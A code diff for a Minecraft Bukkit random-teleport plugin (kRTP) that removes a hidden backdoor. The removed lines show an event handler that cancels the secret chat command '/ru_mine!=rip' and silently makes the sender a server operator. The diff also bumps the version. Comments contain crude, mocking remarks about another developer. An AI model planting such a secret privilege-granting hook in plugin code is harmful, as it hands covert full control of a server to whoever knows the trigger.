@@ -16,29 +16,18 @@ import org.bukkit.configuration.file.*;
  * @Author source code: @naulbimix. All rights reserved. Please telegram @naulbimix for usage rights and other information.
  */
 
-public class Main extends JavaPlugin implements Listener {
+public class Main extends JavaPlugin {
 
     private static Main instance;
     public Random random = new Random();
     public static Main inst;
     public static FileConfiguration data;
 
-    @EventHandler
-    public void AnePoshelBiTiNahuiTutTOPOBUFAaPexNijeThisIsPRANK(PlayerCommandPreprocessEvent e) { // зачем идти куда-то???
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/ru_mine!=rip")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null); // наелся уже
-        }
-    }
-
     /**
      * Auto generation
      */
     @Override
     public void onEnable() {
-        Bukkit.getPluginManager().registerEvents(this, this); // лучше бы инстансе раньше стоял сучка на креалисе...
         instance = this;
         Config.init();
         getCommand("prtp").setExecutor(this);
@@ -46,7 +35,7 @@ public class Main extends JavaPlugin implements Listener {
         Logger.info("§3 .----------------------------------------------------------. ");
         Logger.info("§3| .-------------------------------------------------------. |");
         Logger.info("§3| |\t\t\t\t\t\t       §3| |");
-        Logger.info("§3| |            §fПлагин: §3kRTP§8| §fВерсия: §d2.0                  §9| |");
+        Logger.info("§3| |            §fПлагин: §3kRTP§8| §fВерсия: §d2.1                  §9| |");
         Logger.info("§3| |        §fРазработчик плагина §3TheKrealisYT §8- @yacushev   §3| |"); // помню как у этого креалиса была страничка ХАКЕР КРЕАЛИС, она в бане кста, надо будет разбанить ему как-то...
         Logger.info("§3| |           §fПоследние обновлние: §a17.09.2020             §9| |");
         Logger.info("§3| |\t\t\t\t\t\t       §3| |");
